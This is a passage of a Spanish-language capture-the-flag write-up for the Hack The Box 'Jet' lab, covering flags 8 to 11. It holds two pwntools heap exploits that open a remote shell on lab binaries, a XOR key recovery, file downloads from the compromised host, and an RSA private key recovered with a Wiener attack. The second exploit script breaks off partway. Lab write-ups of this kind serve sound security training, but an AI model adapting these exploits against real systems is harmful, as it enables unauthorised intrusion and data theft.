+        </span><span class="kd">if</span><span class="p"> keyPos </span><span class="kd">==</span><span class="k"> len</span><span class="p">(key) </span><span class="kd">-</span><span class="na"> 1</span><span class="p">:
+            keyPos </span><span class="kd">=</span><span class="na"> 0
+        </span><span class="kd">else</span><span class="p">:
+            keyPos </span><span class="kd">+=</span><span class="na"> 1</span><span class="p">
+    hexVal </span><span class="kd">=</span><span class="s2"> ''
+    </span><span class="kd">for</span><span class="p"> n</span><span class="kd"> in</span><span class="p"> xored:
+        hexVal </span><span class="kd">+=</span><span class="p"> n
+    </span><span class="kd">return</span><span class="p"> hexVal
+
+</span><span class="kd">with </span><span class="k">open</span><span class="p">(</span><span class="s2">'message.txt'</span><span class="p">) </span><span class="kd">as</span><span class="p"> f:
+    content </span><span class="kd">=</span><span class="p"> f.read()
+
+key </span><span class="kd">=</span><span class="p"> sys.argv[</span><span class="na">1</span><span class="p">]
+
+</span><span class="kd">with </span><span class="k">open</span><span class="p">(</span><span class="s2">'encrypted.txt'</span><span class="p">,</span><span class="s2"> 'w'</span><span class="p">) </span><span class="kd">as</span><span class="p"> f:
+    output </span><span class="kd">=</span><span class="p"> f.write(binascii.unhexlify(superCrypt(content, key)))</span>
+</code></pre></div></div>
+
+<div><p>Podemos jugar con <a href="https://github.com/hellman/xortool">xortool</a>, aunque no es muy preciso conseguimos una idea de la clave</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ xortool </span><span class="p">encrypted.txt -b
+The most probable key lengths:
+17:  15.7%
+4608 possible key(s) of length 17:
+SECXREZEBIN\x06ROCF^
+SECXREZEBIN\x06RBCF^
+SECXREZEBIN\x02ROCF^
+SECXREZEBIN\x02RBCF^
+SECXREZEBINNROCF^o</span>
+</code></pre></div></div>
+
+<div><p>Despues de un par de pruebas con el lenght encontramos securewebincrocks</p></div>
+<div><p>Sabiendo la key con <a href="https://github.com/ShawnDEvans/xorpy/blob/master/xor.py">xor.py</a> podemos desencriptar el mensaje y conseguir la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">encrypted.txt | </span><span class="s2">python2</span><span class="p"> xor.py securewebincrocks
+Hello mate!
+
+First of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!
+
+Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.
+Make sure those binaries are kept safe!
+
+To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.
+
+The ports are 5555 and 7777.
+Have fun and keep it safe!
+
+</span><span class="kd">JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}</span><span class="p">
+
+Cheers - Alex
+
+-----------------------------------------------------------------------------
+This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.
+-----------------------------------------------------------------------------</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 8</h3></strong></div>
+<div><strong><h3>JET{3sc4p3_s3qu3nc3s_4r3_fun}</h3></strong></div>
+<div><p>Problemas con el servicio (lo actualizaré en un par de dias)</p></div>
+
+<div><strong><h3>Flag 9</h3></strong></div>
+<div><strong><h3>JET{h34p_f0r_73h_b4bi3z}</h3></strong></div>
+<div><p>También vemos un .zip el cual tiene de contraseña securewebincrocks nuevamente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">alex@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$ unzip exploitme.zip 
+Archive:  exploitme.zip
+[exploitme.zip] membermanager password: </span><span class="kd">securewebincrocks</span><span class="p">
+  inflating: </span><span class="kd">membermanager</span><span class="p">
+  inflating: </span><span class="kd">memo
+</span><span class="s2">alex@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Tenemos los binarios que corren en los puertos 5555 y 7777</p></div>
+<div><p>En este punto podemos analizarlos y después crear un script y explotarlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from</span><span class="p"> pwn </span><span class="kd">import </span><span class="p">*
+</span><span class="kd">import</span><span class="p"> warnings
+
+warnings.simplefilter(</span><span class="s2">"ignore"</span><span class="p">)
+
+shell </span><span class="kd">=</span><span class="p"> remote(</span><span class="s2">'10.13.37.10'</span><span class="p">, </span><span class="na">5555</span><span class="p">)
+ldiff </span><span class="kd">= </span><span class="na">0x3c5520</span><span class="p">
+rdiff </span><span class="kd">=</span><span class="na"> 0xf7250</span><span class="p">
+sdiff </span><span class="kd">= </span><span class="na">0x45390
+
+</span><span class="kd">def </span><span class="k">add</span><span class="p">(</span><span class="no">size</span><span class="p">,</span><span class="no"> content</span><span class="p">):
+    shell.sendline(</span><span class="k">b</span><span class="s2">"1"</span><span class="p">)
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"size:"</span><span class="p">)
+    shell.sendline(</span><span class="k">str</span><span class="p">(size))
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"username:"</span><span class="p">)
+    shell.sendline(content)
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"6. exit"</span><span class="p">)
+
+</span><span class="kd">def </span><span class="k">edit</span><span class="p">(</span><span class="no">id</span><span class="p">,</span><span class="no"> mode</span><span class="p">,</span><span class="no"> content</span><span class="p">):
+    shell.sendline(</span><span class="k">b</span><span class="s2">"2"</span><span class="p">)
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"2. insecure edit"</span><span class="p">)
+    shell.sendline(</span><span class="k">str</span><span class="p">(mode))
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"index:"</span><span class="p">)
+    shell.sendline(</span><span class="k">str</span><span class="p">(id))
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"new username:"</span><span class="p">)
+    shell.sendline(content)
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"6. exit"</span><span class="p">)
+
+</span><span class="kd">def </span><span class="k">ban</span><span class="p">(</span><span class="no">id</span><span class="p">):
+    shell.sendline(</span><span class="k">b</span><span class="s2">"3"</span><span class="p">)
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"index:"</span><span class="p">)
+    shell.sendline(</span><span class="k">str</span><span class="p">(id))
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"6. exit"</span><span class="p">)
+
+</span><span class="kd">def </span><span class="k">change</span><span class="p">(</span><span class="no">name</span><span class="p">):
+    shell.sendline(</span><span class="k">b</span><span class="s2">"4"</span><span class="p">)
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"enter new name:"</span><span class="p">)
+    shell.sendline(name)
+
+name = </span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> * </span><span class="na">8</span><span class="p">
+
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"enter your name:"</span><span class="p">)
+shell.sendline(name)
+add(</span><span class="na">0x88</span><span class="p">, </span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x88</span><span class="p">)
+add(</span><span class="na">0x100</span><span class="p">, </span><span class="k">b</span><span class="s2">"B"</span><span class="kd"> *</span><span class="na"> 8</span><span class="p">)
+
+payload </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"D"</span><span class="kd"> *</span><span class="na"> 0x160</span><span class="p">
+payload </span><span class="kd">+=</span><span class="p"> p64(</span><span class="na">0</span><span class="p">)
+payload </span><span class="kd">+=</span><span class="p"> p64(</span><span class="na">0x21</span><span class="p">)
+
+add(</span><span class="na">0x500</span><span class="p">, payload)
+add(</span><span class="na">0x88</span><span class="p">, </span><span class="k">b</span><span class="s2">"E"</span><span class="kd"> *</span><span class="na"> 8</span><span class="p">)
+shell.recv()
+ban(</span><span class="na">2</span><span class="p">)
+
+payload </span><span class="kd">= </span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x88</span><span class="p">
+payload </span><span class="kd">+=</span><span class="p"> p16(</span><span class="na">0x281</span><span class="p">)
+
+edit(</span><span class="na">0</span><span class="p">,</span><span class="na"> 2</span><span class="p">, payload)
+shell.recv()
+shell.sendline(</span><span class="k">b</span><span class="s2">"5"</span><span class="p">)
+shell.recvline()
+
+libcr </span><span class="kd">= </span><span class="k">int</span><span class="p">(shell.recvline()[:</span><span class="kd">-</span><span class="na">1</span><span class="p">], </span><span class="na">10</span><span class="p">)
+libcb </span><span class="kd">= </span><span class="p">libcr </span><span class="kd">-</span><span class="p"> rdiff
+libcs </span><span class="kd">= </span><span class="p">libcb </span><span class="kd">+</span><span class="p"> sdiff
+
+payload </span><span class="kd">=</span><span class="p"> p64(</span><span class="na">0</span><span class="p">) </span><span class="kd">*</span><span class="na"> 3</span><span class="p">
+payload </span><span class="kd">+=</span><span class="p"> p64(libcs)
+
+change(payload)
+
+lall </span><span class="kd">=</span><span class="p"> libcb </span><span class="kd">+</span><span class="p"> ldiff
+nptr </span><span class="kd">=</span><span class="na"> 0x6020a0</span><span class="p">
+
+payload </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B"</span><span class="kd"> *</span><span class="na"> 8</span><span class="kd">*</span><span class="na">32</span><span class="p">
+payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"/bin/sh\x00"</span><span class="p">
+payload </span><span class="kd">+=</span><span class="p"> p64(</span><span class="na">0x61</span><span class="p">)
+payload </span><span class="kd">+=</span><span class="p"> p64(</span><span class="na">0</span><span class="p">)
+payload </span><span class="kd">+=</span><span class="p"> p64(lall </span><span class="kd">-</span><span class="na"> 0x10</span><span class="p">)
+payload </span><span class="kd">+=</span><span class="p"> p64(</span><span class="na">2</span><span class="p">)
+payload </span><span class="kd">+=</span><span class="p"> p64(</span><span class="na">3</span><span class="p">)
+payload </span><span class="kd">+=</span><span class="p"> p64(</span><span class="na">0</span><span class="p">) </span><span class="kd">*</span><span class="na"> 21</span><span class="p">
+payload </span><span class="kd">+=</span><span class="p"> p64(nptr)
+
+edit(</span><span class="na">1</span><span class="p">,</span><span class="na"> 1</span><span class="p">, payload)
+time.sleep(</span><span class="na">3</span><span class="p">)
+shell.recv()
+shell.sendline(</span><span class="k">b</span><span class="s2">"1"</span><span class="p">)
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"size:"</span><span class="p">)
+shell.sendline(</span><span class="k">str</span><span class="p">(</span><span class="na">0x80</span><span class="p">))
+shell.sendline(</span><span class="k">b</span><span class="s2">"export TERM=xterm; cd"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo conseguimos shell como membermanager y su flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> membermanager.py
+[</span><span class="s2">+</span><span class="p">] Opening connection to 10.13.37.10 on port 5555: Done
+[</span><span class="na">*</span><span class="p">] Switching to interactive mode
+</span><span class="kd">$</span><span class="p"> id
+uid=1006(membermanager) gid=1006(membermanager) groups=1006(membermanager)
+</span><span class="kd">$</span><span class="p"> hostname -I
+10.13.37.10 dead:beef::250:56ff:feb9:8e05 
+</span><span class="kd">$</span><span class="p"> cat flag.txt
+</span><span class="kd">JET{h34p_f0r_73h_b4bi3z}</span><span class="p">
+
+                                                 __----~~~~~~~~~~~------___
+                                      .  .   ~~//====......          __--~ ~~
+                      -.            \_|//     |||\\  ~~~~~~::::... /~
+                   ___-==_       _-~o~  \/    |||  \\            _/~~-
+           __---~~~.==~||\=_    -_--~/_-~|-   |\\   \\        _/~
+       _-~~     .=~    |  \\-_    '-~7  /-   /  ||    \      /
+     .~       .~       |   \\ -_    /  /-   /   ||      \   /
+    /  ____  /         |     \\ ~-_/  /|- _/   .||       \ /
+    |~~    ~~|--~~~~--_ \     ~==-/   | \~--===~~        .\
+             '         ~-|      /|    |-~\~~       __--~~
+                         |-~~-_/ |    |   ~\_   _-~            /\
+                              /  \     \__   \/~                \__
+                          _--~ _/ | .-~~____--~-/                  ~~==.
+                         ((->/~   '.|||' -_|    ~~-/ ,              . _||
+                                    -_     ~\      ~~---l__i__i__i--~~_/
+                                    _-~-__   ~)  \--______________--~~
+                                  //.-~~~-~_--~- |-------~~~~~~~~
+                                         //.-~~~--\</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 10</h3></strong></div>
+<div><strong><h3>JET{n3xt_t1m3_p1ck_65537}</h3></strong></div>
+
+<div><p>En el directorio de tony podemos ver un par de archivos, un secreto entre ellos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">membermanager@jet</span><span class="p">:</span><span class="na">/home/tony</span><span class="p">$ ls -l *
+-rw-r--r-- 1 root root  129 Dec 28  2017 key.bin.enc
+-rw-r--r-- 1 root root 4768 Dec 28  2017 secret.enc
+
+keys:
+total 4
+-rw-r--r-- 1 root root 451 Dec 28  2017 public.crt
+</span><span class="s2">membermanager@jet</span><span class="p">:</span><span class="na">/home/tony</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Descargaremos los 3 para trabajar mas comodamente en local</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">membermanager@jet</span><span class="p">:</span><span class="na">/home/tony</span><span class="p">$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget</span><span class="p"> http://10.13.37.10:8000/key.bin.enc
+Longitud: 129 [application/octet-stream]
+Grabando a: «key.bin.enc»
+
+key.bin.enc              100%[=========================================>]
+
+«key.bin.enc» guardado [129/129]
+
+</span><span class="s2">❯ wget</span><span class="p"> http://10.13.37.10:8000/secret.enc
+Longitud: 4768 (4.7K) [application/octet-stream]
+Grabando a: «secret.enc»
+
+secret.enc               100%[=========================================>]
+
+«secret.enc» guardado [4768/4768]
+
+</span><span class="s2">❯ wget</span><span class="p"> http://10.13.37.10:8000/keys/public.crt
+Longitud: 451 [application/x-x509-ca-cert]
+Grabando a: «public.crt»
+
+public.crt               100%[=========================================>]
+
+«public.crt» guardado [451/451]
+
+</span><span class="s2">❯ ls</span><span class="p">
+ key.bin.enc   public.crt   secret.enc</span>
+</code></pre></div></div>
+
+<div><p>Ya que tenemos una clave publica jugaremos con RsaCtfTool para intentar obtener la privada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> RsaCtfTool.py --publickey public.crt --private
+[*] Testing key public.crt.
+[*] Performing wiener attack on public.crt.
+-----BEGIN RSA PRIVATE KEY-----
+MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
+gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
+ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
+zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
+EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
+i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
+d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
+A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
+h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
+cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
+fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur
+bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
+-----END RSA PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Ahora con la privada podemos obtener el mensaje secreto y la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ openssl</span><span class="p"> rsautl -decrypt -ssl -inkey private.crt -in key.bin.enc -out output
+</span><span class="s2">❯ openssl</span><span class="p"> aes-256-cbc -d -in secret.enc -pass file:output
+ ▄▄▄██▀▀▀▓█████▄▄▄█████▓      ▄████▄   ▒█████   ███▄ ▄███▓                                                                                                   
+   ▒██   ▓█   ▀▓  ██▒ ▓▒     ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒    Congratulations!!                                                           
+   ░██   ▒███  ▒ ▓██░ ▒░     ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░                                                                                      
+▓██▄██▓  ▒▓█  ▄░ ▓██▓ ░      ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██     Jet: https://jet.com/careers                                                           
+ ▓███▒   ░▒████▒ ▒██▒ ░  ██▓ ▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒    HTB: https://www.hackthebox.eu                                                     
+ ▒▓▒▒░   ░░ ▒░ ░ ▒ ░░    ▒▓▒ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░                                                                                                     
+ ▒ ░▒░    ░ ░  ░   ░     ░▒    ░  ▒     ░ ▒ ▒░ ░  ░      ░    </span><span class="kd">JET{n3xt_t1m3_p1ck_65537}</span><span class="p">                                                              
+ ░ ░ ░      ░    ░       ░   ░        ░ ░ ░ ▒  ░      ░                                                                                                        
+ ░   ░      ░  ░          ░  ░ ░          ░ ░         ░                                                                                                        
+                          ░  ░                                                                                                                                 
+                                  Props to:           ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▄▄▄█████▓ ██░ ██ ▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒     ▓█████  █    ██ 
+                                                      ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░     ▓█   ▀  ██  ▓██▒
+                                      blink (jet)     ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░     ▒███   ▓██  ▒██░
+                                      g0blin (htb)    ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒      ▒▓█  ▄ ▓▓█  ░██░
+                                      forGP (htb)     ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄  ▒██▒ ░ ░▓█▒░██▓░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒ ██▓ ░▒████▒▒▒█████▓ 
+                                      ch4p (htb)       ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░ ▒▓▒ ░░ ▒░ ░░▒▓▒ ▒ ▒ 
+                                      xero (0x00sec)   ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ░     ▒ ░▒░ ░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░ ░▒   ░ ░  ░░░▒░ ░ ░ 
+                                                       ░  ░░ ░  ░   ▒   ░        ░ ░░ ░   ░       ░  ░░ ░   ░    ░    ░ ░ ░ ░ ▒   ░    ░   ░      ░    ░░░ ░ ░ 
+                                                       ░  ░  ░      ░  ░░ ░      ░  ░             ░  ░  ░   ░  ░ ░          ░ ░   ░    ░    ░     ░  ░   ░     
+                                                                        ░                                             ░                     ░                  </span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 11</h3></strong></div>
+<div><strong><h3>JET{7h47s_7h3_sp1r17}</h3></strong></div>
+
+<div><p>Al igual que el anterior hay que analizar el binario para hacer un script para explotarlo</p></div>
+<div><p>El script final quedaria algo así</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from</span><span class="p"> pwn </span><span class="kd">import</span><span class="p"> *
+</span><span class="kd">import</span><span class="p"> warnings
+
+warnings.simplefilter(</span><span class="s2">"ignore"</span><span class="p">)
+
+shell </span><span class="kd">=</span><span class="p"> remote(</span><span class="s2">"10.13.37.10"</span><span class="p">,</span><span class="na"> 7777</span><span class="p">)
+
+</span><span class="kd">def </span><span class="k">cmemo</span><span class="p">(</span><span class="no">data</span><span class="p">,</span><span class="no"> answer</span><span class="no">,</span><span class="no"> one_more_data</span><span class="kd">=</span><span class="na">None</span><span class="p">):
+    shell.sendlineafter(</span><span class="k">b</span><span class="s2">"> "</span><span class="p">,</span><span class="k">b</span><span class="s2">"1"</span><span class="p">)
+    shell.sendlineafter(</span><span class="k">b</span><span class="s2">"Data: "</span><span class="p">, data)
+    </span><span class="kd">if</span><span class="p"> answer[:</span><span class="na">3</span><span class="p">] </span><span class="kd">==</span><span class="s2"> "yes"</span><span class="p">:
+        shell.sendafter(</span><span class="k">b</span><span class="s2">"[yes/no] "</span><span class="p">, answer)
+    </span><span class="kd">else</span><span class="p">:
+        shell.sendafter(</span><span class="k">b</span><span class="s2">"[yes/no] "</span><span class="p">, answer)
+        shell.sendafter(</span><span class="k">b</span><span class="s2">"Data: "</span><span class="p">, one_more_data)
+
+</span><span class="kd">def </span><span class="k">smemo</span><span class="p">():
+    shell.sendlineafter(</span><span class="k">b</span><span class="s2">"> "</span><span class="p">,</span><span class="k">b</span><span class="s2">"2"</span><span class="p">)
+    shell.recvuntil(</span><span class="k">b</span><span class="s2">"Data: "</span><span class="p">)
+
+</span><span class="kd">def </span><span class="k">dmemo</span><span class="p">():
+    shell.sendlineafter(</span><span class="k">b</span><span class="s2">"> "</span><span class="p">,</span><span class="k">b</span><span class="s2">"3"</span><span class="p">)
+
+</span><span class="kd">def </span><span class="k">tout</span><span class="p">(</span><span class="no">answer</span><span class="p">):
+    shell.sendlineafter(</span><span class="k">b</span><span class="s2">"> "</span><span class="p">,</span><span class="k">b</span><span class="s2">"4"</span><span class="p">)
+    shell.sendafter(</span><span class="k">b</span><span class="s2">"[yes/no] "</span><span class="p">, answer)
+
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x1f</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x1f</span><span class="p">)
+smemo()
+shell.recv(</span><span class="na">0x20</span><span class="p">)
+
+schunk </span><span class="kd">=</span><span class="p"> u64(shell.recv(</span><span class="na">6</span><span class="p">)</span><span class="kd"> +</span><span class="k"> b</span><span class="s2">"\x00"</span><span class="kd"> *</span><span class="na"> 2</span><span class="p">)</span><span class="kd"> -</span><span class="p"> (</span><span class="na">0x7ffee7b7d4d0</span><span class="kd"> - </span><span class="na">0x7ffee7b7d3c0</span><span class="p">)
+
+dmemo()
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x28</span><span class="p">, </span><span class="k">b</span><span class="s2">"no"</span><span class="p">, </span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x28</span><span class="p">)
+smemo()
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"A" </span><span class="kd">*</span><span class="na"> 0x28</span><span class="p">)
+shell.recv(</span><span class="na">1</span><span class="p">)
+
+canary </span><span class="kd">=</span><span class="p"> u64(</span><span class="k">b</span><span class="s2">"\x00"</span><span class="kd"> +</span><span class="p"> shell.recv(</span><span class="na">7</span><span class="p">))
+
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x18</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x18</span><span class="p">)
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x18</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x17</span><span class="p">)
+smemo()
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"A" </span><span class="kd">*</span><span class="na"> 0x18</span><span class="p">)
+shell.recv(</span><span class="na">1</span><span class="p">)
+
+heap </span><span class="kd">=</span><span class="p"> u64(</span><span class="k">b</span><span class="s2">"\x00"</span><span class="kd"> +</span><span class="p"> shell.recv(</span><span class="na">3</span><span class="p">) </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\x00"</span><span class="kd"> *</span><span class="na"> 4</span><span class="p">)
+
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x18</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x8</span><span class="kd"> +</span><span class="p"> p64(</span><span class="na">0x91</span><span class="p">) </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x8</span><span class="p">)
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x7 </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\x00"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> * </span><span class="na">0x8</span><span class="p">)
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x7 </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\x00"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> * </span><span class="na">0x8</span><span class="p">)
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x7 </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\x00"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> * </span><span class="na">0x8</span><span class="p">)
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x7 </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\x00"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> * </span><span class="na">0x8</span><span class="kd"> +</span><span class="p"> p64(</span><span class="na">0x31</span><span class="p">))
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x7 </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\x00"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> * </span><span class="na">0x8</span><span class="p">)
+tout(</span><span class="k">b</span><span class="s2">"no\x00"</span><span class="kd"> +</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 21</span><span class="kd"> +</span><span class="p"> p64(heap </span><span class="kd">+</span><span class="na"> 0xe0</span><span class="p">))
+dmemo()
+tout(</span><span class="k">b</span><span class="s2">"no\x00"</span><span class="kd"> +</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 21</span><span class="kd"> +</span><span class="p"> p64(heap </span><span class="kd">+</span><span class="na"> 0xc0</span><span class="p">))
+dmemo()
+smemo()
+
+leak </span><span class="kd">=</span><span class="p"> u64(shell.recv(</span><span class="na">6</span><span class="p">) </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\x00"</span><span class="kd"> *</span><span class="na"> 2</span><span class="p">)
+libc </span><span class="kd">=</span><span class="p"> leak </span><span class="kd">-</span><span class="p"> (</span><span class="na">0x7fbae5f32b78 </span><span class="kd">-</span><span class="na"> 0x7fbae5b6e000</span><span class="p">)
+
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x28</span><span class="p">,</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x10</span><span class="kd"> +</span><span class="p"> p64(</span><span class="na">0x0</span><span class="p">)</span><span class="kd"> +</span><span class="p"> p64(</span><span class="na">0x21</span><span class="p">)</span><span class="kd"> + </span><span class="p">p64(schunk))
